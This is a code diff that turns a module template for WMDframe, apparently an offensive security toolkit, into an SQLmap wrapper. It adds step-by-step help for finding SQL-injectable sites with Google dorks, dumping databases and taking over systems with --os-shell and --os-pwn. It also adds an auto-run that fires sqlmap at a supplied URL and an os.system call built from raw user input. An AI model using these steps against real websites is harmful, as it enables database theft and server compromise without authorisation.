@@ -28,8 +28,8 @@ except:
 # Parser START
 # ==========================
 parser = argparse.ArgumentParser()
-# parser.add_argument('-ip', '--lanip', help='IP to monitor', metavar='IP')  # Example. Use with "args.lanip"
 parser.add_argument('-r', '--run', action='store_true', help='Start monitoring')
+parser.add_argument('-u', '--url', help='URL to inject')
 args, unknown = parser.parse_known_args()
 # ==========================
 # Parser END
@@ -40,7 +40,7 @@ args, unknown = parser.parse_known_args()
 # Core START
 # ==========================
 config = core.config()
-# INTERFACE_NET = (config['NETWORK']['INTERFACE_NET'])
+SQLMAP_SYM = (config['TOOLS']['SQLMAP_SYM'])
 
 logger = core.log()
 # logger.debug('Starting module')
@@ -63,35 +63,68 @@ class Options():
     """Main class for module."""
 
     Author = 'Thomas TJ (TTJ)'
-    Name = 'Template module'
-    Call = 'tempmod'
-    Modulename = 'templatemodule'  # Filename
-    Category = 'cracktheWWW'
-    Type = 'sha512'
+    Name = 'SQLmap'
+    Call = 'sqlmap'
+    Modulename = 'sqlmap'  # Filename
+    Category = 'sql'
+    Type = 'sqli'
     Version = '0.1'
     License = 'MIT'
-    Description = 'Showing structure of modules'
+    Description = 'Just an activation of SQLmap.'
     Datecreation = '2017/02/01'
     Lastmodified = '2017/02/01'
 
-    def __init__(self, req_var1, req_var2):
+    def __init__(self):
         """Define variables and show options on run."""
-        self.req_var1 = req_var1
-        self.req_var2 = req_var2
         self.show_all()
 
     def poss_opt(self):
         """Possible options. These variables are checked when the user tries to 'set' an option."""
-        return ('req_var1', 'req_var2')
+        return ('NA')
 
     def show_opt(self):
         """Show the possible options."""
         print(
-            ''
-            '\n\t' + bc.OKBLUE + ('%-*s %-*s %-*s %s' % (15, 'OPTION', 8, 'RQ', 18, 'VALUE', 'DESCRIPTION')) + bc.ENDC +
-            '\n\t' + ('%-*s %-*s %-*s %s' % (15, '------', 8, '--', 18, '-----', '-----------')) +
-            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'req_var1:', 8, 'y', 18, self.req_var1, 'Setting1')) +
-            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'req_var2:', 8, 'n', 18, self.req_var2, 'Setting2')) +
+            '' +
+            '\n\t' + bc.OKBLUE + 'HOW TO:' + bc.ENDC +
+            '\n\t' + bc.BOLD + '1) Find a URL which is prone to SQLi' + bc.ENDC +
+            '\n\t' + ' - a) Search the web' +
+            '\n\t' + ' - b) Use the module gdsqli' +
+            '\n\t' + ' - c) Use SQLmap\'s Google Dork function: -g "inurl:\".php?id=1\""' +
+            '\n\t' + bc.BOLD + '2) Goto 2a or directly to 3' + bc.ENDC +
+            '\n\t' + ' - a) sqlmap -u "target"' +
+            '\n\t' + bc.BOLD + '3) Get databases' + bc.ENDC +
+            '\n\t' + ' - a) sqlmap -u "target" --dbs' +
+            '\n\t' + bc.BOLD + '4) Get tables in database' + bc.ENDC +
+            '\n\t' + ' - a) sqlmap -u "target" --tables -D DatabaseName' +
+            '\n\t' + bc.BOLD + '5) Get columns from table' + bc.ENDC +
+            '\n\t' + ' - a) sqlmap -u "target" --columns -D DatabaseName -T TableName' +
+            '\n\t' + bc.BOLD + '6) Get data from table' + bc.ENDC +
+            '\n\t' + ' - a) sqlmap -u "target" --dump -D DatabaseName -T TableName' +
+            '\n\t' +
+            '\n\t' + bc.OKBLUE + 'TROUBLE - Append one or more of the following:' + bc.ENDC +
+            '\n\t' + bc.BOLD + '1) Use random user agents' + bc.ENDC +
+            '\n\t' + ' - a) --random-agent' +
+            '\n\t' + bc.BOLD + '2) Turn off payload casting mechanism' + bc.ENDC +
+            '\n\t' + ' - a) --no-cast' +
+            '\n\t' + bc.BOLD + '3) Use the beginner wizard' + bc.ENDC +
+            '\n\t' + ' - a) --wizard' +
+            '\n\t' +
+            '\n\t' + bc.OKBLUE + 'ENHANCED:' + bc.ENDC +
+            '\n\t' + bc.BOLD + '1) FASTER' + bc.ENDC +
+            '\n\t' + ' - a) --threads 4' +
+            '\n\t' + bc.BOLD + '2) Just do it - no questions' + bc.ENDC +
+            '\n\t' + ' - a) --batch' +
+            '\n\t' + bc.BOLD + '3) Run it with all' + bc.ENDC +
+            '\n\t' + ' - a) -u "target" --dbs --batch --random-agent --threads 4' +
+            '\n\t' +
+            '\n\t' + bc.OKBLUE + 'SYSTEM TAKEOVER:' + bc.ENDC +
+            '\n\t' + bc.BOLD + '1) Execute an operating system command' + bc.ENDC +
+            '\n\t' + ' - a) --os-cmd=OSCMD' +
+            '\n\t' + bc.BOLD + '2) Real shell' + bc.ENDC +
+            '\n\t' + ' - a) --os-shell' +
+            '\n\t' + bc.BOLD + '3) Prompt for an OOB shell, Meterpreter or VNC' + bc.ENDC +
+            '\n\t' + ' - a) --os-pwn' +
             '\n'
         )
 
@@ -101,12 +134,10 @@ class Options():
             ''
             '\n\t' + bc.OKBLUE + 'COMMANDS:' + bc.ENDC +
             '\n\t' + '---------' +
-            '\n\t' + ('%-*s ->\t%s' % (9, 'run', 'Run the script')) +
-            # '\n\t' + ('%-*s ->\t%s' % (9, 'custom', 'Custom extra function')) +
-            '\n\t' + ('%-*s ->\t%s' % (9, 'runcom', 'Run program with specific arguments <runcom [ARGS]>')) +
+            '\n\t' + ('%-*s ->\t%s' % (9, 'run', 'Run SQLmap')) +
+            '\n\t' + ('%-*s ->\t%s' % (9, 'runcom', 'Run sqlmap arguments <runcom [ARGS]>')) +
             '\n\t' + ('%-*s ->\t%s' % (9, 'info', 'Information')) +
             '\n\t' + ('%-*s ->\t%s' % (9, 'help', 'Help')) +
-            '\n\t' + ('%-*s ->\t%s' % (9, 'pd', 'Predefined arguments for "runcom"')) +
             '\n\t' + ('%-*s ->\t%s' % (9, 'so', 'Show options')) +
             '\n\t' + ('%-*s ->\t%s' % (9, 'sa', 'Show module info')) +
             '\n\t' + ('%-*s ->\t%s' % (9, 'set', 'Set options, <set [PARAMETER] [VALUE]>')) +
@@ -142,32 +173,18 @@ def run():
     print('\tRunning running')
 
 
-# OPTIONAL
-def runcom(arguments):
-    """The run function with special arguments - optional."""
-    print('\tRunning special with arguments')
-    print(arguments)
+def runcom(command):
+    """Run SQLmap with userdefined args."""
+    print('')
+    os.system(SQLMAP_SYM + ' ' + command)
+    print('')
 
 
-# OPTIONAL
-def predefinedCommands():
-    """Show predifined commands - optional."""
-    print(
-        '' +
-        '\n\t' + bc.OKBLUE + 'COMMANDS:' + bc.ENDC +
-        '\n\t' + '---------'
-    )
-
-    print("""
-         -> Super args            = -T4 -A -v
-         -> Super duber           = -sS -sU -T4 -A -v
-         -> Better args           = -p 1-65535 -T4 -A -v
-    """)
-
-    print(
-        '\t' + bc.ITALIC + 'Use \'runcom\' followed by arguments' + bc.ENDC +
-        '\n'
-    )
+def run_auto():
+    """Autorun function."""
+    print('')
+    os.system(SQLMAP_SYM + ' -u "' + args.url + '" --dbs --batch --random-agent --threads 4')
+    print('')
 
 
 # OPTIONAL
@@ -175,6 +192,8 @@ def info():
     """Show the modules info - optional."""
     print("""
         Module for use in WMDframe.
+        Just a simple integration of SQLmap. The modules does nothing
+        except from some information on SQLmap commands.
         """)
     # Delete the parser info, if args.parse is not used.
     if parser.format_help():
@@ -182,12 +201,6 @@ def info():
         for line in parser.format_help().strip().splitlines():
             print('\t' + line)
     print('')
-
-
-# OPTIONAL
-def helpMe():
-    """Show a help menu - optional."""
-    pass
 
 
 # CONSOLE
@@ -204,6 +217,9 @@ def console():
     # Run module
     elif 'run' in userinput[:1]:
         run()
+    elif 'runcom' in userinput[:1]:
+        uservalue = value.split(' ', 1)[1]  # Use all text after "set parameter"
+        runcom(uservalue)
     # Set options
     elif 'set' in userinput[:1]:
         useroption = str(userinput[1:2]).strip('[]\'')  # The parameter to set
@@ -229,15 +245,6 @@ def console():
     # Show info
     elif 'info' in userinput[:1]:
         info()
-    # Show help
-    elif 'help' in userinput[:1]:
-        helpMe()
-    # Show predefined commands
-    elif 'pd' in userinput[:1]:
-        predefinedCommands()
-    # Run special command from userinput
-    elif 'runcom' in userinput[:1]:
-        runcom(str(userinput[1:]).strip('[]\''))
     else:
         command = str(userinput[:1]).strip('[]\'')
         print(bc.WARN + '\n    Error, no options for: ' + command + '\n' + bc.ENDC)
@@ -248,26 +255,26 @@ def console():
 def main():
     """The first function to run."""
     print('\n')
-    print('\t  ______                   __  ___          __      __     ')
-    print('\t /_  __/___ ___  ____     /  |/  /___  ____/ /_  __/ /__   ')
-    print('\t  / / / __ `__ \/ __ \   / /|_/ / __ \/ __  / / / / / _ \  ')
-    print('\t / / / / / / / / /_/ /  / /  / / /_/ / /_/ / /_/ / /  __/  ')
-    print('\t/_/ /_/ /_/ /_/ .___/  /_/  /_/\____/\__,_/\__,_/_/\___/   ')
-    print('\t             /_/                                           ')
+    print('\t   _____ ____    __                          ')
+    print('\t  / ___// __ \  / /   ____ ___  ____ _____   ')
+    print('\t  \__ \/ / / / / /   / __ `__ \/ __ `/ __ \  ')
+    print('\t ___/ / /_/ / / /___/ / / / / / /_/ / /_/ /  ')
+    print('\t/____/\___\_\/_____/_/ /_/ /_/\__,_/ .___/   ')
+    print('\t                                  /_/        ')
     print('\n')
-    # If module require root:
-    # if os.getuid() != 0:
-    #     print('r00tness is needed due to XXX!')
-    #     print('Run the script again as root/sudo')
-    #     return None
     print('\t' + bc.OKBLUE + 'CHECKING REQUIREMENTS' + bc.ENDC)
-    # comm.checkNetConnectionV()
-    # print('')
+    comm.checkNetConnectionV()
+    comm.checkInstalled(SQLMAP_SYM)
+    print('')
     global sop
     # The parameters to be passed to the module on run
-    sop = Options('FIRST', 'SECOND')
+    sop = Options()
     if args.run:
-        run()
+        if not args.url:
+            print(bc.WARN + '\t[!]  No URL passed as argument with "-u [URL]" - returning to console.\n' + bc.ENDC)
+            console()
+        else:
+            run_auto()
     else:
         console()
 
@@ -277,4 +284,4 @@ if args.run:
 
 
 # For testing uncomment "main()", place module in root directory and run module with "python3 modulename.py"
-# main()
+#  main()
